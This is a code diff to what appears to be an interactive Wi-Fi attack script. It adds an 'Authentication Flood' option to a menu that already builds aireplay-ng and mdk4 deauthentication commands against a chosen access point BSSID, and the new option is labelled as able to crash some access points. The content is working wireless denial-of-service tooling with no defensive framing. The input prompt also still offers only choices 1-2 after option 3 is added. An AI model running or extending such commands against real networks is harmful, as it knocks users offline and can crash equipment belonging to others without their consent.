@@ -89,6 +89,7 @@ def start_deauth(bssid, channel, iface):
     print(Fore.CYAN + Style.BRIGHT + "\n----- Select Attack Method -----" + Style.RESET_ALL)
     print(f"{Fore.YELLOW}1. {Fore.RESET}aireplay-ng (classic, stable)")
     print(f"{Fore.YELLOW}2. {Fore.RESET}mdk4 (stronger, faster, more aggressive)")
+    print(f"{Fore.YELLOW}3. {Fore.RESET}Authentication Flood (mdk4 only, may crash some APs)") 
     print()
     
     choice = input_field("Choose attack method (1-2): ")
@@ -99,6 +100,9 @@ def start_deauth(bssid, channel, iface):
     elif choice == "2":
         tool = "mdk4"
         cmd_str = f"mdk4 {iface} d -B {bssid} -s 9999"
+    elif choice == "3":
+        tool = "mdk4 (Auth Flood)"
+        cmd_str = f"mdk4 {iface} a -a {bssid} -s 9999"
     else:
         err("[!] Invalid choice." + Style.RESET_ALL)
         return
